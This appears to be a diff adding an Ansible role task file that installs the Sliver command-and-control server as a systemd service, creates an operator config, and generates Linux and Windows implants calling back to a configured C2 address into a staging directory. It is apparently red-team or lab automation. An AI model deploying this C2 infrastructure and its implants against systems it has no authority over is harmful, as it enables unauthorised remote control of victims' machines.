@@ -1,0 +1,104 @@
+---
+# Installs Sliver C2 server, runs it as a systemd service,
+# then generates Linux + Windows implants into the staging directory.
+
+- name: "[Sliver-Server] Install dependencies (expect, curl)"
+  package:
+    name:
+      - expect
+      - curl
+    state: present
+
+- name: "[Sliver-Server] Get latest Sliver release tag"
+  uri:
+    url: "https://api.github.com/repos/BishopFox/sliver/releases/latest"
+    return_content: true
+  register: sliver_release_info
+  when: sliver_version == "latest"
+
+- name: "[Sliver-Server] Set Sliver download URL"
+  set_fact:
+    sliver_server_url: "https://github.com/BishopFox/sliver/releases/download/{{ sliver_release_info.json.tag_name }}/sliver-server_linux"
+    sliver_client_url: "https://github.com/BishopFox/sliver/releases/download/{{ sliver_release_info.json.tag_name }}/sliver-client_linux"
+
+- name: "[Sliver-Server] Download sliver-server binary"
+  get_url:
+    url:  "{{ sliver_server_url }}"
+    dest: "{{ sliver_server_bin }}"
+    mode: "0755"
+    force: false
+
+- name: "[Sliver-Server] Download sliver-client binary"
+  get_url:
+    url:  "{{ sliver_client_url }}"
+    dest: "{{ sliver_client_bin }}"
+    mode: "0755"
+    force: false
+
+- name: "[Sliver-Server] Create sliver-server systemd service"
+  copy:
+    dest: /etc/systemd/system/sliver-server.service
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Sliver C2 Server
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      ExecStart={{ sliver_server_bin }} daemon
+      Restart=on-failure
+      RestartSec=5
+      StandardOutput=journal
+      StandardError=journal
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: "[Sliver-Server] Enable and start sliver-server"
+  systemd:
+    name:         sliver-server
+    enabled:      true
+    state:        started
+    daemon_reload: true
+
+- name: "[Sliver-Server] Wait for Sliver gRPC port to be ready"
+  wait_for:
+    host:    127.0.0.1
+    port:    "{{ sliver_grpc_port }}"
+    timeout: 60
+
+- name: "[Sliver-Server] Generate operator config"
+  shell: |
+    {{ sliver_server_bin }} operator \
+      --name ansible \
+      --lhost 127.0.0.1 \
+      --save {{ sliver_operator_cfg }}
+  args:
+    creates: "{{ sliver_operator_cfg }}"
+
+- name: "[Sliver-Server] Copy implant generation expect script"
+  copy:
+    src:  gen-implants.expect
+    dest: /tmp/gen-implants.expect
+    mode: "0755"
+
+- name: "[Sliver-Server] Check if implants already exist"
+  stat:
+    path: "{{ staging_dir }}/sliver-implant-linux"
+  register: sliver_implant_stat
+
+- name: "[Sliver-Server] Generate Linux + Windows implants"
+  shell: |
+    expect /tmp/gen-implants.expect \
+      "{{ sliver_c2_ip }}" \
+      "{{ sliver_c2_port }}" \
+      "{{ staging_dir }}" \
+      "{{ sliver_operator_cfg }}"
+  when: not sliver_implant_stat.stat.exists
+  register: sliver_gen
+  failed_when: sliver_gen.rc != 0
+
+- name: "[Sliver-Server] Confirm implants are staged"
+  debug:
+    msg: "Sliver implants staged: {{ staging_dir }}/sliver-implant-linux  {{ staging_dir }}/sliver-implant.exe"
